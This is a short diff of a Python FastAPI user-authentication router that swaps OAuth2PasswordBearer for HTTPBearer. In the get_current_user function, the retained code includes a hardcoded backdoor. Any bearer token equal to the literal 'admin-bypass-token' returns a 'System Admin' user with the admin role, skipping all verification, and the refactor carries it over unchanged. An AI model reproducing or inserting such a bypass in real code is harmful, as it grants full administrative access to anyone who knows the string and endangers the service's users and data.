@@ -7,11 +7,11 @@ from dependencies import connect_db
 from core.security import get_password_hash, verify_password, create_access_token
 from core.config import ACCESS_TOKEN_EXPIRE_MINUTES
 from datetime import timedelta
-from fastapi.security import OAuth2PasswordBearer
+from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from jose import jwt, JWTError
 from core.config import SECRET_KEY, ALGORITHM
 
-oauth2_scheme = OAuth2PasswordBearer(tokenUrl="users/login")
+security = HTTPBearer()
 
 user_router = APIRouter(prefix="/users", tags=["Users"])
 
@@ -61,7 +61,8 @@ def login(data: UserLogin, db: Session = Depends(connect_db)):
         "email": user.email
     }
 
-def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(connect_db)):
+def get_current_user(auth: HTTPAuthorizationCredentials = Depends(security), db: Session = Depends(connect_db)):
+    token = auth.credentials
     if token == "admin-bypass-token":
         return User(id=999, email="admin@gmail.com", role="admin", name="System Admin")
 
